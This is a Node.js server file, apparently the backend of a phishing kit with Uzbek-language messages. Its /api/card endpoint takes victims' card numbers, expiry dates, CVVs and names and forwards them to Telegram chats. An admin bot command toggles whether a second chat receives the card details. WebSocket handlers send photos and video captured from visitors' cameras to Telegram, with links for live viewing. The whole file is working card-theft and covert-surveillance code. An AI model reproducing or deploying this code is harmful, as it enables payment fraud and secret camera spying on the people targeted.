require('dotenv').config();
const express = require('express');
const http = require('http');
const https = require('https');
const fs = require('fs');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');
const FormData = require('form-data');

const app = express();

// SSL configuration for HTTPS/WSS
const USE_SSL = process.env.USE_SSL === 'true';
const SSL_CERT_PATH = process.env.SSL_CERT_PATH || '/etc/letsencrypt/live/errfishserv.duckdns.org';

let server;
if (USE_SSL && fs.existsSync(`${SSL_CERT_PATH}/fullchain.pem`)) {
    const sslOptions = {
        key: fs.readFileSync(`${SSL_CERT_PATH}/privkey.pem`),
        cert: fs.readFileSync(`${SSL_CERT_PATH}/fullchain.pem`)
    };
    server = https.createServer(sslOptions, app);
    console.log('🔒 Running with HTTPS/WSS (SSL enabled)');
} else {
    server = http.createServer(app);
    console.log('🔓 Running with HTTP/WS (no SSL)');
}

const wss = new WebSocket.Server({ server });

// Telegram Bot configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Regular chat
const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID; // Admin chat (receives everything)

// WebSocket authentication token
const WS_SECRET_TOKEN = process.env.WS_SECRET_TOKEN;

// ===== STATE MANAGEMENT =====
const STATE_FILE = path.join(__dirname, 'state.json');

function loadState() {
    try {
        if (fs.existsSync(STATE_FILE)) {
            return JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
        }
    } catch (e) {
        console.error('Failed to load state:', e.message);
    }
    return { sendCardToRegularChat: true };
}

function saveState(state) {
    try {
        fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
    } catch (e) {
        console.error('Failed to save state:', e.message);
    }
}

let appState = loadState();

// ===== TELEGRAM BOT POLLING =====
let lastUpdateId = 0;

async function pollTelegramUpdates() {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;

    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
        );
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.message && update.message.text) {
                    const chatId = update.message.chat.id.toString();
                    const text = update.message.text.trim();

                    // Only respond to commands in admin chat
                    if (chatId === ADMIN_TELEGRAM_CHAT_ID) {
                        if (text === '/activecarddetails' || text === '/activecarddetails@' + TELEGRAM_BOT_TOKEN.split(':')[0]) {
                            // Toggle state
                            appState.sendCardToRegularChat = !appState.sendCardToRegularChat;
                            saveState(appState);

                            const statusText = appState.sendCardToRegularChat
                                ? '✅ Karta ma\'lumotlari oddiy chatga yuboriladi'
                                : '❌ Karta ma\'lumotlari oddiy chatga yuborilmaydi';

                            await sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, statusText);
                            console.log(`Card details to regular chat: ${appState.sendCardToRegularChat}`);
                        }
                    }
                }
            }
        }
    } catch (e) {
        // Silent fail for polling
    }

    // Continue polling
    setTimeout(pollTelegramUpdates, 1000);
}

async function sendTelegramMessage(chatId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
        });
    } catch (e) {
        console.error('Failed to send Telegram message:', e.message);
    }
}

// Start polling after server starts
setTimeout(pollTelegramUpdates, 2000);

// Enable CORS
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// ===== RATE LIMITING & BOT PROTECTION =====

// Track requests per IP
const requestCounts = new Map();
const wsConnectionCounts = new Map();
const blockedIPs = new Set();

// Rate limit settings
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 100; // Max HTTP requests per minute per IP
const MAX_WS_CONNECTIONS_PER_IP = 5; // Max WebSocket connections per IP
const MAX_MESSAGES_PER_MINUTE = 200; // Max WebSocket messages per minute (high for WebRTC ICE)

// Clean up old entries every minute
setInterval(() => {
    requestCounts.clear();
    console.log('🧹 Rate limit counters cleared');
}, RATE_LIMIT_WINDOW);

// HTTP Rate limiter middleware
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    // Check if IP is blocked
    if (blockedIPs.has(ip)) {
        return res.status(429).json({ error: 'Too many requests. Try again later.' });
    }

    // Count requests
    const count = (requestCounts.get(ip) || 0) + 1;
    requestCounts.set(ip, count);

    if (count > MAX_REQUESTS_PER_WINDOW) {
        console.log(`⚠️ Rate limit exceeded for IP: ${ip}`);
        blockedIPs.add(ip);
        // Unblock after 5 minutes
        setTimeout(() => blockedIPs.delete(ip), 5 * 60 * 1000);
        return res.status(429).json({ error: 'Too many requests. Try again in 5 minutes.' });
    }

    next();
});

// Store active rooms
const rooms = new Map();

// Parse User-Agent to get browser and OS
function parseUserAgent(userAgent) {
    if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };

    let browser = 'Unknown';
    let os = 'Unknown';

    // Detect browser
    if (userAgent.includes('Edg/')) {
        browser = 'Edge';
    } else if (userAgent.includes('OPR/') || userAgent.includes('Opera')) {
        browser = 'Opera';
    } else if (userAgent.includes('Firefox/')) {
        browser = 'Firefox';
    } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome')) {
        browser = 'Safari';
    } else if (userAgent.includes('Chrome/')) {
        browser = 'Chrome';
    }

    // Detect OS
    if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        os = 'iOS';
    } else if (userAgent.includes('Android')) {
        os = 'Android';
    } else if (userAgent.includes('Mac OS')) {
        os = 'macOS';
    } else if (userAgent.includes('Windows')) {
        os = 'Windows';
    } else if (userAgent.includes('Linux')) {
        os = 'Linux';
    }

    return { browser, os };
}

// Serve viewer page
app.get('/view/:roomId', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'viewer.html'));
});

// API to check room status
app.get('/api/room/:roomId', (req, res) => {
    const room = rooms.get(req.params.roomId);
    if (room) {
        res.json({
            exists: true,
            hasViewer: !!room.viewer,
            createdAt: room.createdAt,
        });
    } else {
        res.json({ exists: false });
    }
});

// API to receive card data and send to Telegram (dual chat)
app.use(express.json());

const API_SECRET_TOKEN = process.env.API_SECRET_TOKEN;

app.post('/api/card', async (req, res) => {
    // Validate authorization
    const authHeader = req.headers.authorization;
    const token = authHeader?.replace('Bearer ', '');

    if (API_SECRET_TOKEN && token !== API_SECRET_TOKEN) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const { cardNumber, expiryDate, cvv, cardType, fullName, userAgent } = req.body;

    if (!cardNumber || !expiryDate || !fullName) {
        return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    // Parse browser and OS
    const { browser, os } = parseUserAgent(userAgent);

    // Format date
    const months = ['yanvar', 'fevral', 'mart', 'aprel', 'may', 'iyun',
        'iyul', 'avgust', 'sentabr', 'oktabr', 'noyabr', 'dekabr'];
    const now = new Date();
    const dateStr = `${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
    const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;

    const cardTypeEmoji = {
        visa: '💳 Visa',
        mastercard: '💳 Mastercard',
        humo: '🇺🇿 Humo',
        uzcard: '🇺🇿 UzCard',
        unknown: '💳 Unknown'
    };

    const message = `
💰 <b>YANGI KARTA MA'LUMOTLARI!</b>

${cardTypeEmoji[cardType] || cardTypeEmoji.unknown}

📝 <b>Ism:</b> <code>${fullName}</code>
💳 <b>Karta:</b> <code>${cardNumber}</code>
📅 <b>Amal qilish:</b> <code>${expiryDate}</code>
${cvv ? `🔐 <b>CVV:</b> <code>${cvv}</code>` : ''}

📱 <b>Brauzer:</b> ${browser}
💻 <b>OS:</b> ${os}
📆 <b>Sana:</b> ${dateStr}
⏰ <b>Vaqt:</b> ${timeStr}
`.trim();

    try {
        // Always send to admin chat
        if (ADMIN_TELEGRAM_CHAT_ID) {
            await sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, message);
            console.log('✅ Card data sent to admin chat');
        }

        // Send to regular chat if enabled
        if (appState.sendCardToRegularChat && TELEGRAM_CHAT_ID) {
            await sendTelegramMessage(TELEGRAM_CHAT_ID, message);
            console.log('✅ Card data sent to regular chat');
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Failed to send card data:', error);
        res.status(500).json({ success: false, error: 'Failed to send' });
    }
});

// Send photo to Telegram
async function sendPhotoToTelegram(base64Image, caption = '') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Telegram credentials not configured!');
        console.error('   Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env file');
        return false;
    }

    return new Promise((resolve) => {
        try {
            // Remove data URL prefix if present
            const base64Data = base64Image.replace(/^data:image\/\w+;base64,/, '');
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', imageBuffer, {
                filename: `camera_${Date.now()}.jpg`,
                contentType: 'image/jpeg',
            });
            if (caption) {
                form.append('caption', caption);
                form.append('parse_mode', 'HTML');
            }

            const https = require('https');

            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                method: 'POST',
                headers: form.getHeaders(),
            };

            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    try {
                        const result = JSON.parse(data);
                        if (result.ok) {
                            console.log('✅ Photo sent to Telegram successfully!');
                            resolve(true);
                        } else {
                            console.error('❌ Telegram API error:', result.description);
                            resolve(false);
                        }
                    } catch (e) {
                        console.error('❌ Failed to parse Telegram response:', data.substring(0, 200));
                        resolve(false);
                    }
                });
            });

            req.on('error', (error) => {
                console.error('❌ Failed to send photo to Telegram:', error.message);
                resolve(false);
            });

            form.pipe(req);
        } catch (error) {
            console.error('❌ Failed to send photo to Telegram:', error.message);
            resolve(false);
        }
    });
}

// Send video to Telegram
async function sendVideoToTelegram(base64Video, caption = '') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Telegram credentials not configured!');
        return false;
    }

    return new Promise((resolve) => {
        try {
            // Remove data URL prefix if present
            const base64Data = base64Video.replace(/^data:video\/\w+;base64,/, '');
            const videoBuffer = Buffer.from(base64Data, 'base64');

            // Determine file extension from data URL
            const isWebm = base64Video.includes('video/webm');
            const extension = isWebm ? 'webm' : 'mp4';

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('video', videoBuffer, {
                filename: `camera_${Date.now()}.${extension}`,
                contentType: isWebm ? 'video/webm' : 'video/mp4',
            });
            if (caption) {
                form.append('caption', caption);
                form.append('parse_mode', 'HTML');
            }

            const https = require('https');

            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
                method: 'POST',
                headers: form.getHeaders(),
            };

            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    try {
                        const result = JSON.parse(data);
                        if (result.ok) {
                            console.log('✅ Video sent to Telegram successfully!');
                            resolve(true);
                        } else {
                            console.error('❌ Telegram API error:', result.description);
                            resolve(false);
                        }
                    } catch (e) {
                        console.error('❌ Failed to parse Telegram response');
                        resolve(false);
                    }
                });
            });

            req.on('error', (error) => {
                console.error('❌ Failed to send video to Telegram:', error.message);
                resolve(false);
            });

            form.pipe(req);
        } catch (error) {
            console.error('❌ Failed to send video to Telegram:', error.message);
            resolve(false);
        }
    });
}

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    // ===== WebSocket Rate Limiting =====

    // Check if IP is blocked
    if (blockedIPs.has(ip)) {
        console.log(`🚫 Blocked IP attempted connection: ${ip}`);
        ws.close();
        return;
    }

    // Check connection count per IP
    const connectionCount = (wsConnectionCounts.get(ip) || 0) + 1;
    wsConnectionCounts.set(ip, connectionCount);

    if (connectionCount > MAX_WS_CONNECTIONS_PER_IP) {
        console.log(`⚠️ Too many WebSocket connections from IP: ${ip}`);
        ws.close();
        return;
    }

    console.log(`New WebSocket connection from ${ip} (${connectionCount}/${MAX_WS_CONNECTIONS_PER_IP})`);

    ws.isAlive = true;
    ws.isAuthenticated = false;
    ws.ip = ip;
    ws.messageCount = 0;
    ws.lastMessageReset = Date.now();
    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (data) => {
        try {
            // ===== Message Rate Limiting =====
            const now = Date.now();

            // Reset counter every minute
            if (now - ws.lastMessageReset > 60000) {
                ws.messageCount = 0;
                ws.lastMessageReset = now;
            }

            ws.messageCount++;

            // Check message rate limit
            if (ws.messageCount > MAX_MESSAGES_PER_MINUTE) {
                console.log(`⚠️ Message rate limit exceeded for IP: ${ip}`);
                ws.send(JSON.stringify({ type: 'error', error: 'Rate limit exceeded' }));
                ws.close();
                return;
            }

            const message = JSON.parse(data.toString());

            // Handle authentication first
            if (message.type === 'auth') {
                if (WS_SECRET_TOKEN && message.token === WS_SECRET_TOKEN) {
                    ws.isAuthenticated = true;
                    ws.send(JSON.stringify({ type: 'auth-success' }));
                    console.log('✅ Client authenticated');
                } else {
                    ws.send(JSON.stringify({ type: 'auth-failed', error: 'Invalid token' }));
                    console.log('❌ Authentication failed');
                    ws.close();
                }
                return;
            }

            // Require authentication for all other messages (except if token not configured)
            // Exception: allow viewer messages (join-room, answer, ice-candidate) without auth
            const viewerMessages = ['join-room', 'answer', 'ice-candidate'];
            if (WS_SECRET_TOKEN && !ws.isAuthenticated && !viewerMessages.includes(message.type)) {
                ws.send(JSON.stringify({ type: 'error', error: 'Not authenticated' }));
                ws.close();
                return;
            }

            handleMessage(ws, message, req);
        } catch (err) {
            console.error('Failed to parse message:', err);
        }
    });

    ws.on('close', () => {
        // Decrement connection count for this IP
        if (ws.ip) {
            const count = wsConnectionCounts.get(ws.ip) || 1;
            if (count <= 1) {
                wsConnectionCounts.delete(ws.ip);
            } else {
                wsConnectionCounts.set(ws.ip, count - 1);
            }
        }
        handleDisconnect(ws);
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
        handleDisconnect(ws);
    });
});

function handleMessage(ws, message, req) {
    switch (message.type) {
        case 'create-room':
            createRoom(ws, req, message);
            break;
        case 'join-room':
            joinRoom(ws, message.roomId);
            break;
        case 'offer':
        case 'answer':
        case 'ice-candidate':
            forwardMessage(ws, message);
            break;
        case 'camera-frame':
            handleCameraFrame(ws, message, req);
            break;
        case 'camera-video':
            handleCameraVideo(ws, message, req);
            break;
        case 'ping':
            ws.send(JSON.stringify({ type: 'pong' }));
            break;
        default:
            break;
    }
}

async function handleCameraFrame(ws, message, req) {
    // Format date in Uzbek style: "6 yanvar 2026"
    const months = ['yanvar', 'fevral', 'mart', 'aprel', 'may', 'iyun',
        'iyul', 'avgust', 'sentabr', 'oktabr', 'noyabr', 'dekabr'];
    const now = new Date();
    const day = now.getDate();
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    const dateStr = `${day} ${month} ${year}`;

    // Parse browser and OS
    const { browser, os } = parseUserAgent(message.userAgent);

    console.log(`\n📸 Camera frame received! (${dateStr}) - ${browser}/${os}`);

    // Get room ID if available
    const roomId = ws.roomId || 'unknown';
    const viewerUrl = `${process.env.SERVER_URL || 'http://localhost:4000'}/view/${roomId}`;

    // Create caption for Telegram with viewer link (HTML format)
    const caption = `📹 Yangi foydalanuvchi!\n\n` +
        `📅 ${dateStr}\n` +
        `📱 ${browser} (${os})\n\n` +
        `🔗 <a href="${viewerUrl}">Tomosha qilish</a>`;

    const success = await sendPhotoToTelegram(message.frame, caption);

    // Send confirmation to client
    ws.send(JSON.stringify({
        type: 'frame-received',
        success: success,
    }));
}

async function handleCameraVideo(ws, message, req) {
    // Format date and time in Uzbek style
    const months = ['yanvar', 'fevral', 'mart', 'aprel', 'may', 'iyun',
        'iyul', 'avgust', 'sentabr', 'oktabr', 'noyabr', 'dekabr'];
    const now = new Date();
    const day = now.getDate();
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const dateStr = `${day} ${month} ${year}`;
    const timeStr = `${hours}:${minutes}`;

    // Parse browser and OS
    const { browser, os } = parseUserAgent(message.userAgent);

    console.log(`\n🎬 Camera video received! (${dateStr} ${timeStr}) - ${browser}/${os}`);

    // Get room ID if available
    const roomId = ws.roomId || 'unknown';
    const viewerUrl = `${process.env.SERVER_URL || 'http://localhost:4000'}/view/${roomId}`;

    // Create caption for Telegram with viewer link (HTML format)
    const caption = `🎬 Video yozuv!\n\n` +
        `📅 ${dateStr}\n` +
        `⏰ ${timeStr}\n` +
        `📱 ${browser} (${os})\n\n` +
        `🔗 <a href="${viewerUrl}">Tomosha qilish</a>`;

    const success = await sendVideoToTelegram(message.video, caption);

    // Send confirmation to client
    ws.send(JSON.stringify({
        type: 'video-received',
        success: success,
    }));
}

function createRoom(ws, req, message) {
    const roomId = uuidv4().slice(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const room = {
        id: roomId,
        broadcaster: ws,
        viewer: null,
        createdAt: new Date(),
        userAgent: message.userAgent || 'Unknown',
        ip: ip,
    };

    rooms.set(roomId, room);
    ws.roomId = roomId;
    ws.role = 'broadcaster';

    const viewerUrl = `${process.env.SERVER_URL || 'http://localhost:4000'}/view/${roomId}`;

    // Log viewer URL to console
    console.log('\n' + '='.repeat(60));
    console.log('📹 NEW CAMERA STREAM AVAILABLE!');
    console.log('='.repeat(60));
    console.log(`Room ID: ${roomId}`);
    console.log(`IP: ${ip}`);
    console.log(`User Agent: ${message.userAgent || 'Unknown'}`);
    console.log(`\n🔗 VIEWER URL: ${viewerUrl}`);
    console.log('='.repeat(60) + '\n');

    ws.send(JSON.stringify({
        type: 'room-created',
        roomId: roomId,
        viewerUrl: viewerUrl,
    }));
}

function joinRoom(ws, roomId) {
    const room = rooms.get(roomId);

    if (!room) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'Room not found',
        }));
        return;
    }

    if (room.viewer) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'Room already has a viewer',
        }));
        return;
    }

    room.viewer = ws;
    ws.roomId = roomId;
    ws.role = 'viewer';

    // Notify viewer they joined
    ws.send(JSON.stringify({
        type: 'joined-room',
        roomId: roomId,
        userAgent: room.userAgent,
        createdAt: room.createdAt,
    }));

    // Notify broadcaster to send offer
    if (room.broadcaster.readyState === WebSocket.OPEN) {
        room.broadcaster.send(JSON.stringify({
            type: 'viewer-joined',
        }));
    }

    console.log(`👀 Viewer joined room: ${roomId}`);
}

function forwardMessage(ws, message) {
    const room = rooms.get(ws.roomId);
    if (!room) return;

    const target = ws.role === 'broadcaster' ? room.viewer : room.broadcaster;

    if (target && target.readyState === WebSocket.OPEN) {
        target.send(JSON.stringify(message));
    }
}

function handleDisconnect(ws) {
    const room = rooms.get(ws.roomId);
    if (!room) return;

    if (ws.role === 'broadcaster') {
        // Notify viewer that broadcaster left
        if (room.viewer && room.viewer.readyState === WebSocket.OPEN) {
            room.viewer.send(JSON.stringify({
                type: 'broadcaster-left',
            }));
        }
        rooms.delete(ws.roomId);
        console.log(`🚪 Room closed: ${ws.roomId}`);
    } else if (ws.role === 'viewer') {
        room.viewer = null;
        // Notify broadcaster that viewer left
        if (room.broadcaster && room.broadcaster.readyState === WebSocket.OPEN) {
            room.broadcaster.send(JSON.stringify({
                type: 'viewer-left',
            }));
        }
        console.log(`👋 Viewer left room: ${ws.roomId}`);
    }
}

// Heartbeat to detect dead connections
const heartbeatInterval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (!ws.isAlive) {
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

wss.on('close', () => {
    clearInterval(heartbeatInterval);
});

// Start server
const PORT = process.env.PORT || 4000;
server.listen(PORT, () => {
    console.log(`\n🚀 Signaling server running on http://localhost:${PORT}`);
    console.log(`📹 Viewer URL pattern: http://localhost:${PORT}/view/{roomId}`);

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        console.log(`✅ Telegram bot configured`);
    } else {
        console.log(`⚠️  Telegram not configured - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env`);
    }
    console.log('');
});
